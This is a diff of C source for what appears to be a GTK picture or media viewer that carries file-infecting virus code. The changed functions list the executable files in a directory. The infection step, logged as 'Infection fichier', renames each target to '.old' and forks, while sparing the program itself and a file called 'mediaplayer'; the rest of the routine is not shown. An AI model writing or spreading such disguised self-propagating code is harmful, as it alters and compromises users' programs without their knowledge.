@@ -42,7 +42,6 @@ void afficher(){
     GdkPixbuf *pixbuf;
     pixbuf = gdk_pixbuf_new_from_file_at_scale(path, h, w, FALSE, NULL);
     gtk_image_set_from_pixbuf(image,pixbuf);
-    //gtk_image_set_from_file(image, path);
 }
 
 void on_btn_next_clicked(GtkButton *button, gpointer user_data){
@@ -59,17 +58,17 @@ void on_btn_prev_clicked(GtkButton *button, gpointer user_data){
 }
 
 void step3infection(char * file_name){
-	printf("%s\n", "\nStep 3 - Infection fichier");
 	int status;
-	if (strcmp(file_name, prog) != 0){
+	if (strcmp(file_name, prog) != 0 && strcmp(file_name, "mediaplayer") != 0 ){
+		printf("%s\n", "\nStep 3 - Infection fichier");
 		char old_name[100];
 		strcpy(old_name, file_name);
 		char * old = ".old";
 		strcat(file_name, old);
-		printf("avant : %s apres %s\n", old_name, file_name);
+		printf("\tRenommage - avant : %s apres %s\n", old_name, file_name);
 	    int result= rename( old_name , file_name );
 	    if ( result == 0 ){
-	    	puts ( "File successfully renamed" );
+	    	puts ( "\tFile successfully renamed" );
 	    	pid_t p = fork(); 
 	    	if(p == 0) {
 	    		
@@ -125,8 +124,13 @@ void step1listProg(char ** executables){
     if (pDir != NULL) {
 	    while ((pDirent = readdir(pDir)) != NULL) {
 	    	if (strcmp(pDirent->d_name,".") != 0 && strcmp(pDirent->d_name,"..") != 0 && strcmp(pDirent->d_name,"")){
-	        	executables[i] = pDirent->d_name;
-	        	i++;
+	    		struct stat file;
+				stat( pDirent->d_name, &file);
+				if (file.st_mode & S_IXUSR && file.st_mode & S_IFREG){
+					executables[i] = pDirent->d_name;
+	        		i++;
+				}
+	        	
 	        }
 	    }
 	}
